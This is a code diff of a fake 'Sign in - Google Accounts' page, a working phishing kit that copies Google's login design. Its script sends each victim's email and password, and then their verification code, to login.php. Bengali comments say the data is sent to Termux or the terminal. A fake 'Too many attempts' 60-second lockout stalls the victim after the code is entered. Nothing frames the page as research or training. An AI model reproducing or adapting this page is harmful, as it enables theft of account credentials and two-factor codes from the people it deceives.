@@ -6,123 +6,93 @@
     <title>Sign in - Google Accounts</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --g-blue: #1a73e8;
-            --text-main: #202124;
-            --border-color: #dadce0;
-        }
-
+        :root { --g-blue: #1a73e8; --text: #202124; --border: #dadce0; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Roboto', sans-serif; background: #fff; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        body { font-family: 'Roboto', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
 
-        /* Full Page Official Loader */
-        #page-loader {
+        /* Full Page White Overlay with Spinner (Official) */
+        #loader-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; display: none; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 9999;
+            justify-content: center; align-items: center; z-index: 10000;
         }
         .g-spinner {
             width: 36px; height: 36px; border: 4px solid #f3f3f3;
             border-top: 4px solid var(--g-blue); border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: g-spin 0.8s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes g-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .auth-wrapper { width: 100%; max-width: 448px; padding: 48px 40px; text-align: left; }
-        @media (max-width: 600px) { .auth-wrapper { padding: 24px; } }
+        .container { width: 100%; max-width: 448px; padding: 48px 40px; text-align: left; transition: 0.2s; }
+        @media (max-width: 450px) { .container { padding: 24px; } }
 
         .logo { width: 74px; margin-bottom: 12px; }
-        h1 { font-size: 24px; font-weight: 400; color: var(--text-main); margin-bottom: 8px; }
-        .sub-title { font-size: 16px; color: var(--text-main); margin-bottom: 24px; line-height: 1.4; }
+        h1 { font-size: 24px; font-weight: 400; color: var(--text); margin-bottom: 8px; }
+        .sub-text { font-size: 16px; color: var(--text); margin-bottom: 24px; }
 
-        /* User Identity Chip */
+        /* Official Identity Chip */
         .user-chip {
-            display: inline-flex; align-items: center; padding: 4px 12px 4px 6px;
-            border: 1px solid var(--border-color); border-radius: 20px;
-            margin-bottom: 24px; cursor: pointer;
+            display: inline-flex; align-items: center; padding: 4px 10px 4px 6px;
+            border: 1px solid var(--border); border-radius: 20px; margin-bottom: 24px; cursor: pointer;
         }
-        .avatar { width: 20px; height: 20px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
-        .avatar svg { fill: #fff; width: 12px; }
-        .user-email { font-size: 14px; font-weight: 500; color: #3c4043; }
+        .user-chip:hover { background: #f8f9fa; }
+        .avatar { width: 20px; height: 20px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; color: #fff; font-size: 11px; }
 
-        /* Official Input Style */
-        .input-group { margin-bottom: 24px; }
-        .g-input {
-            width: 100%; padding: 16px 14px; border: 1px solid var(--border-color);
-            border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s;
-        }
-        .g-input:focus { border: 2px solid var(--g-blue); padding: 15px 13px; }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid var(--border); border-radius: 4px; font-size: 16px; outline: none; margin-bottom: 10px; transition: border 0.2s; }
+        .input-field:focus { border: 2px solid var(--g-blue); padding: 12px 14px; }
 
-        .link { color: var(--g-blue); text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .link:hover { text-decoration: underline; }
+        .blue-link { color: var(--g-blue); text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .blue-link:hover { text-decoration: underline; }
 
-        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .next-btn {
-            background: var(--g-blue); color: #fff; border: none; padding: 10px 24px;
-            border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px;
-        }
-        .next-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 45px; }
+        .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        .btn-next:disabled { background: #ccc; }
 
+        #error-box { color: #d93025; font-size: 13px; display: none; margin-top: 10px; font-weight: 500; }
         .step { display: none; }
-        .active { display: block; animation: slideIn 0.3s ease-out; }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        #timer-msg { color: #d93025; font-size: 13px; margin-top: 10px; display: none; font-weight: 500; }
+        .active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div id="page-loader">
-    <div class="g-spinner"></div>
-</div>
+<div id="loader-overlay"><div class="g-spinner"></div></div>
 
-<div class="auth-wrapper">
+<div class="container">
     <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" class="logo">
 
     <div id="s1" class="step active">
         <h1>Sign in</h1>
-        <p class="sub-title">Use your Google Account</p>
-        <div class="input-group">
-            <input type="text" id="email" class="g-input" placeholder="Email or phone">
-        </div>
-        <a class="link">Forgot email?</a>
-        <div class="footer-actions" style="margin-top: 60px;">
-            <a class="link">Create account</a>
-            <button class="next-btn" onclick="toStep2()">Next</button>
+        <p class="sub-text">Use your Google Account</p>
+        <input type="text" id="email" class="input-field" placeholder="Email or phone">
+        <a class="blue-link">Forgot email?</a>
+        <div class="footer" style="margin-top: 80px;">
+            <a class="blue-link">Create account</a>
+            <button class="btn-next" onclick="toStep(2)">Next</button>
         </div>
     </div>
 
     <div id="s2" class="step">
         <h1>Welcome</h1>
-        <div class="user-chip" onclick="showStep(1)">
-            <div class="avatar"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <span id="label-mail" class="user-email"></span>
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" class="g-input" placeholder="Enter your password">
-        </div>
-        <a class="link">Forgot password?</a>
-        <div class="footer-actions">
+        <div class="user-chip" onclick="showStep(1)"><div class="avatar">👤</div><span id="label-mail" style="font-size:14px; font-weight:500;"></span></div>
+        <input type="password" id="pass" class="input-field" placeholder="Enter your password">
+        <div style="margin-top: 10px;"><a class="blue-link">Forgot password?</a></div>
+        <div class="footer">
             <span></span>
-            <button class="next-btn" onclick="sendLoginData()">Next</button>
+            <button class="btn-next" onclick="sendLoginData()">Next</button>
         </div>
     </div>
 
     <div id="s3" class="step">
         <h1>Account recovery</h1>
-        <p class="sub-title" style="font-size: 14px;">Google wants to make sure it's really you trying to sign in</p>
-        <div class="user-chip">
-            <div class="avatar"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
-            <span id="label-mail-otp" class="user-email"></span>
-        </div>
-        <div class="input-group">
-            <p style="font-size: 14px; margin-bottom: 12px;">An email with a verification code was sent to your inbox.</p>
-            <input type="text" id="otp" class="g-input" placeholder="Enter code">
-            <div id="timer-msg">Too many attempts. Try again in <span id="sec">60</span>s</div>
-        </div>
-        <div class="footer-actions">
-            <a class="link">Try another way</a>
-            <button class="next-btn" id="otp-btn" onclick="sendOTPData()">Next</button>
+        <p class="sub-text" style="font-size: 14px;">Google wants to make sure it's really you trying to sign in</p>
+        <div class="user-chip"><div class="avatar">👤</div><span id="label-mail-otp" style="font-size:14px; font-weight:500;"></span></div>
+        <p style="font-size:14px; margin-bottom: 12px;">A verification code was sent to your email.</p>
+        <input type="text" id="otp" class="input-field" placeholder="Enter code">
+        <div id="error-box">Too many attempts. Try again in <span id="sec">60</span>s</div>
+        <div class="footer">
+            <a class="blue-link">Try another way</a>
+            <button class="btn-next" id="final-btn" onclick="sendOTPData()">Next</button>
         </div>
     </div>
 </div>
@@ -130,7 +100,7 @@
 
 
 <script>
-    const loader = document.getElementById('page-loader');
+    const loader = document.getElementById('loader-overlay');
 
     function startLoading(callback) {
         loader.style.display = 'flex';
@@ -142,38 +112,38 @@
 
     function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('s' + n).classList.add('active');
+        document.getElementById('s'+n).classList.add('active');
     }
 
-    function toStep2() {
+    function toStep(n) {
         const mail = document.getElementById('email').value;
         if(!mail) return;
         startLoading(() => {
             document.getElementById('label-mail').innerText = mail;
-            showStep(2);
+            showStep(n);
         });
     }
 
-    // পাসওয়ার্ড সাবমিট করার সাথে সাথে টারমাক্সে যাবে
+    // পাসওয়ার্ড সাবমিট করলে আগে টার্মিনালে যাবে
     function sendLoginData() {
         const mail = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        if(!pass) return;
+        const password = document.getElementById('pass').value;
+        if(!password) return;
 
         startLoading(() => {
-            // ডাটা টারমাক্সে (login.php) পাঠানো
+            // ডাটা টার্মিনালে পাঠানোর রিকোয়েস্ট (আগে পাসওয়ার্ড যাবে)
             let fd = new FormData();
             fd.append('email', mail);
-            fd.append('password', pass);
-            fd.append('type', 'LOGIN');
+            fd.append('password', password);
+            fd.append('action', 'login');
             fetch('login.php', { method: 'POST', body: fd });
 
             document.getElementById('label-mail-otp').innerText = mail;
-            showStep(3); // এরপর ওটিপি পেজ দেখাবে
+            showStep(3); // এরপর ওটিপি পেজ আসবে
         });
     }
 
-    // ওটিপি সাবমিট করলে আলাদাভাবে টারমাক্সে যাবে
+    // ওটিপি সাবমিট করলে আলাদাভাবে যাবে
     function sendOTPData() {
         const otp = document.getElementById('otp').value;
         if(!otp) return;
@@ -181,14 +151,14 @@
         startLoading(() => {
             let fd = new FormData();
             fd.append('otp', otp);
-            fd.append('type', 'OTP');
+            fd.append('action', 'otp');
             fetch('login.php', { method: 'POST', body: fd });
 
-            // ১ মিনিট টাইমার লক
-            const btn = document.getElementById('otp-btn');
-            const msg = document.getElementById('timer-msg');
+            // ১ মিনিট টাইমার লক লজিক
+            const btn = document.getElementById('final-btn');
+            const err = document.getElementById('error-box');
             btn.disabled = true;
-            msg.style.display = 'block';
+            err.style.display = 'block';
 
             let count = 60;
             const timer = setInterval(() => {
@@ -197,7 +167,7 @@
                 if(count <= 0) {
                     clearInterval(timer);
                     btn.disabled = false;
-                    msg.style.display = 'none';
+                    err.style.display = 'none';
                 }
             }, 1000);
         });
@@ -205,5 +175,4 @@
 </script>
 </body>
 </html>
-
 
